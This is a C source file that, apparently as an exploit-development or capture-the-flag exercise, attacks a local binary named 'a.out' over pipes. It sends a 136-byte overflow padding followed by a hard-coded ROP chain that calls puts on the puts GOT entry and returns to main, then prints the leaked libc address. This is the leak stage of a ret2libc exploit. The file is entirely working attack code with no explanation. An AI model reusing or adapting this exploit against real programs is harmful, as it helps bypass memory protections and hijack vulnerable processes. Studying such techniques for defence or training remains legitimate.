#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

int main(void)
{
    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    char *const argv[] = {"a.out", NULL};
    int readPipe[2];
    int writePipe[2];
    char buff[300];
    char inbuf[100];

    pipe(readPipe);
    pipe(writePipe);

    if (!fork()) {
        dup2(writePipe[0], STDIN_FILENO);
        dup2(readPipe[1], STDOUT_FILENO);
        close(writePipe[1]);
        close(readPipe[0]);
        execv("a.out", argv);
        exit(0);
    }

    memset(buff, 'A', 136);

    unsigned long *rop = (unsigned long *) (buff + 136);
    *rop ++= 0x0040120b; // pop rdi
    *rop ++= 0x00404018; // got address puts()
    *rop ++= 0x00401030; // puts@plt
    *rop ++= 0x0040115d; // address main

    read(readPipe[0], inbuf, 56);
    printf(" %s %s", "->", inbuf);

    write(writePipe[1], buff, 136 + (8 * 4));
    close(writePipe[1]);

    unsigned long adress = 0;
    read(readPipe[0], &adress, 6);
    printf("puts@got -> %p ", adress);

}
